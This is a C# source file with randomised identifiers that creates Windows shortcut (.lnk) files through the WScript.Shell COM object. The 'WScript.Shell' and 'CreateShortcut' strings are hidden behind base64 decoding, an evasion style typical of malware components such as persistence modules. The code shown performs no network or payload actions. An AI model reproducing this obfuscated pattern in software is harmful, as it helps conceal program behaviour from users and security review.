using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace VsYjhNTIRPBh;

public class DDkfEBeYSSAdQ
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface bfLyAByDTXh
	{
		[DispId(0)]
		string eNHtFiGRFMs
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string ioXceRPFpjbe
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string SwfOoShXldzO
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string JCPHPsQgye
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string ZcyJTYdIymIwBhh
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string YzzOYwjlkoeudD
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string cOmrQdXVErTh
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int jKAGjuHUxxE
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string pAOPRwVMOXPsXh
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type bzhWjVgeUTmK = Type.GetTypeFromProgID(BdNzYJbFQkt.bRWwIGxQDNUf("V1NjcmlwdC5TaGVsbA=="));

	private static object dDwoYSSOqqxJck = Activator.CreateInstance(bzhWjVgeUTmK);

	public static void CcRLCRCYPbbBj(string ewqsLgFJAFY, string EriGstwJKmwHzG, string RMvjaXutzKTy, string ejcIFJZzUUOlqJlI, string TkERWcRaxjWiT, string AaqssmJkEbnQP, string lsczEfJdcXb)
	{
		try
		{
			bfLyAByDTXh bfLyAByDTXh = (bfLyAByDTXh)bzhWjVgeUTmK.InvokeMember(BdNzYJbFQkt.bRWwIGxQDNUf("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, dDwoYSSOqqxJck, new object[1] { ewqsLgFJAFY });
			bfLyAByDTXh.SwfOoShXldzO = TkERWcRaxjWiT;
			bfLyAByDTXh.JCPHPsQgye = AaqssmJkEbnQP;
			bfLyAByDTXh.cOmrQdXVErTh = EriGstwJKmwHzG;
			bfLyAByDTXh.pAOPRwVMOXPsXh = ejcIFJZzUUOlqJlI;
			bfLyAByDTXh.ioXceRPFpjbe = RMvjaXutzKTy;
			if (!string.IsNullOrEmpty(lsczEfJdcXb))
			{
				bfLyAByDTXh.ZcyJTYdIymIwBhh = lsczEfJdcXb;
			}
			bfLyAByDTXh.Save();
		}
		catch (Exception ex)
		{
			if (BdNzYJbFQkt.nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(BdNzYJbFQkt.vsTGVFSJmItByidD, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
